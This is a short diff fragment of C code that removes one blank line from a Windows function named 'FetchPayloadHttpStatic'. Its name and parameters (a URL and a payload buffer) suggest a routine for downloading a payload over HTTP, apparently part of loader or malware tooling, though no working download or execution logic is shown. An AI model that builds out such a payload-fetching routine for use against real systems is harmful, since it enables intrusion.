@@ -2,7 +2,6 @@
 
 BOOL FetchPayloadHttpStatic(LPWSTR pURL,DWORD sPayload, PVOID pPayloadBuffer)
 {
-	
 	DWORD dwBytesWritten;
 	BOOL state = FALSE;
 	HINTERNET hInetSession, hInetFile = NULL;
